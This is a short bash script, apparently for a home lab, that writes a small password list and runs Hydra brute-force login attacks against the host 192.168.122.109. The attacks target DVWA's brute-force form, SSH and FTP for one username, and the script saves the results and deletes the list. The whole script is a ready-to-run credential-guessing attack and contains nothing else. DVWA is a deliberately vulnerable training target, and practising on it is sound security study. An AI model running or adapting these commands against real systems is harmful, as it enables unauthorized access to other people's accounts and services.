#!/bin/bash

TARGET="192.168.122.109"
USERNAME="fruitto"
WORDLIST="wordlist_test.txt"

cat <<EOF >$WORDLIST
123456
password
admin123
qwerty
root123
111111
letmein
wrongpass1
wrongpass2
wrongpass3
P@ssword
rootroot
EOF

hydra -l $USERNAME -P $WORDLIST $TARGET http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect." -V -o brute_results.txt

hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V
hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V

rm $WORDLIST

